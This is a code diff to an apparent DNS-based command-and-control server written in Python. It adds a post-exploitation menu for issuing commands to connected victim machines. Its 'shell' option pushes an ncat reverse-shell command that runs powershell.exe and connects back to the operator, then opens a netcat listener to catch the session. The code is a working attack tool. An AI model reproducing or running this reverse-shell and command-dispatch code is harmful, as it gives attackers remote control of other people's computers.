@@ -23,26 +23,51 @@ class DNSServer:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                     sock.bind((self.ip,self.port))
                     print("UDP Server Listening...\n")
-                    req, address = sock.recvfrom(512) #start listening
+                    req, address = sock.recvfrom(512)
                     self.request = req
                     self.count += 1
                     print("Got a client at " + address[0])
                     self.clients.append(address[0])
-                print('Type "exit" as a command to quit')
-                command = input("\nEnter a command:")
-                if command == "exit":
+                    c = address[0]
+                    print('Type "exit" as a command to quit')
+                    print("Connected to " + address[0] + ":")
+                    post()
+                choice = input("\n" + "(" + c + ") > ")
+                if choice == "exit":
                     sock.close()
                     self.count = 0
                     break
-                if c != None:
+                elif choice == "help":
+                    post()
+                elif choice == "command":
+                    command = input("Enter a command:")
                     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                     sock.bind((self.ip,self.port))
                     p = Payload(c)
-                else:
-                    p = Payload(address[0])
-                p.payload(sock,self.request,command)
-                commandRan = True
-                newDataList = list()
+                    p.payload(sock,self.request,command)
+                    commandRan = True
+                    newDataList = list()
+                elif choice == "shell":
+                    '''listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    listener.bind((self.ip,56345))
+                    listener.listen(1)'''
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.bind((self.ip,self.port))
+                    p = Payload(c)
+                    p.payload(sock,self.request,("ncat --udp " + self.ip + " 4242 -e powershell.exe"))
+                    os.system("nc -luvp 4242")
+                    '''client_socket, client_address = listener.accept()
+                    command = ""
+                    while True:
+                        command = input()
+                        client_socket.send(command.encode())
+                        if command == "exit":
+                            client_socket.close()
+                            listener.close()
+                            break
+                        ans = client_socket.recv((1024*128)).decode()
+                        print(ans)'''
+
             if commandRan:
                 req, address = sock.recvfrom(512) #start listening
                 printWithTime("UDP", f"Received {len(req)} bytes from {address}")
@@ -83,6 +108,14 @@ class DNSServer:
         self.showClients()
         client = input("Which Client would you like to connect to?")
         return self.clients[int(client)-1]
+    
+def post():
+    print("\nList of built-in post-exploitation commands:")
+    print("-------------------------------------------------------")
+    print("command\t\t\tEnter commands manually")
+    print("shell\t\t\tStarts a reverse shell on the system")
+    print("exit\t\t\tReturn to main menu")
+    print("help\t\t\tDisplay list of built-in post-exploitation commands\n")
 
 def printWithTime(head, message):
         curr_time = datetime.now().strftime("%H:%M:%S.%f")
